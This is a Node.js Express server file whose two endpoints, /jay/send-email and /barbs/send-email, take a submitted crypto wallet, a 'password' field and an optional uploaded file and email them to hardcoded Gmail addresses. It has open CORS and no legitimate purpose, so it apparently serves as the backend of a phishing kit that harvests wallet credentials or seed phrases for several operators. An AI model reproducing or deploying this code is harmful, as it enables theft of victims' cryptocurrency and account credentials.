const express = require("express");
const { success, error } = require("consola");
const { connect } = require("mongoose");
const passport = require("passport");
const { DB, PORT } = require("./config");

const nodemailer = require("nodemailer");
const multer = require("multer");
const fs = require("fs");
const path = require("path");
const upload = multer({ dest: "uploads/" }); // files will be saved in 'uploads' folder

const { emailAddress, emailPassword } = require("./config");

const app = express(); // Initialize the application

var cors = require("cors");
app.use(cors({ origin: true, credentials: true }));

// Middlewares
app.use(express.json());
app.use(passport.initialize());

require("./middlewares/passport")(passport);

app.get("/scheduled-task", (req, res) => {
  console.log("Scheduled task triggered!");
  // Run your task here, e.g., database cleanup, sending emails, etc.
  res.send("Task completed");
});

app.post("/jay/send-email", upload.single("file"), async (req, res) => {
  const { text, wallet } = req.body;
  const file = req.file;

  if (!text || !wallet) {
    return res.status(400).json({ error: "Wallet and password are required." });
  }

  try {
    let transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: emailAddress,
        pass: emailPassword,
      },
    });

    // Prepare email options
    const mailOptions = {
      from: emailAddress,
      to: "deanlewis267@gmail.com",
      subject: "Wallet Address",
      text: `Wallet: ${wallet}\nPassword: ${text}`,
      attachments: [],
    };

    // Only attach the file if it exists
    if (file) {
      mailOptions.attachments.push({
        filename: file.originalname,
        path: file.path,
      });
    }

    // Send the email
    await transporter.sendMail(mailOptions);

    // Clean up file if it was uploaded
    if (file) {
      fs.unlink(file.path, () => {
        console.log("Temporary file deleted.");
      });
    }

    res.status(200).json({ message: "Email sent successfully!" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ error: "Error sending email" });
  }
});

app.post("/barbs/send-email", upload.single("file"), async (req, res) => {
  const { text, wallet } = req.body;
  const file = req.file;

  if (!text || !wallet) {
    return res.status(400).json({ error: "Wallet and password are required." });
  }

  try {
    let transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: emailAddress,
        pass: emailPassword,
      },
    });

    // Prepare email options
    const mailOptions = {
      from: emailAddress,
      to: "dorisnewsome4@gmail.com",
      subject: "Wallet Address",
      text: `Wallet: ${wallet}\nPassword: ${text}`,
      attachments: [],
    };

    // Only attach the file if it exists
    if (file) {
      mailOptions.attachments.push({
        filename: file.originalname,
        path: file.path,
      });
    }

    // Send the email
    await transporter.sendMail(mailOptions);

    // Clean up file if it was uploaded
    if (file) {
      fs.unlink(file.path, () => {
        console.log("Temporary file deleted.");
      });
    }

    res.status(200).json({ message: "Email sent successfully!" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ error: "Error sending email" });
  }
});

const startApp = async () => {
  try {
    // Connection with DB
    await connect(DB, {
      useUnifiedTopology: true,
      useNewUrlParser: true,
    });

    success({
      message: `Successfully connected with the Database \n${DB}`,
      badge: true,
    });

    // Start listening for the server on PORT
    app.listen(PORT, () =>
      success({ message: `Server started on PORT ${PORT}`, badge: true })
    );
  } catch (err) {
    error({
      message: `Unable to connect with Database \n${err}`,
      badge: true,
    });
    process.exit(1); // Exit the process with an error code
  }
};

startApp();
